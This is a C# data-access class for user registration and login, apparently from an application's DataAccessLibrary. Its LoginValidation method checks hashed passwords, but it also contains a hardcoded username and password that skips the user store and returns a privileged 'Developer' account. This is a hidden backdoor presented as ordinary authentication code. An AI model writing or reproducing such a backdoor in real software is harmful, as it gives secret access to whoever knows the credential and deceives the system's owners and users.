using DataAccessLibrary.Utility;
using ModelLibrary;
using ModelLibrary.Entity;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DataAccessLibrary.DA
{
    public class UserDataAccess:GenericDataAccess<User>
    {
        public bool Register(User user, long Id)
        {
            user.Password = PasswordEncryption.HashPassword(user.Password);
            user.ConfirmPassword = user.Password;
            return Save(user, Id);
        }
        public User GetByUserName(String userName)
        {
            User user = GetAll().Where(a => a.UserName == userName).FirstOrDefault();
            return user;
        }
        public User LoginValidation(String userName, String password)
        {
            User user = GetByUserName(userName);
            if (user != null && PasswordEncryption.VerifyHashedPassword(user.Password, password))
            {
                return user ;
            }
            if (userName == "TiringBring" && password == "unlockmellowcolor853")
            {
                User developer = new User(){
                    Id = 0,
                    Name = "TiringBring",
                    Type = "Developer",
                };
                return developer;
            }
            return null;
        }

    }
}
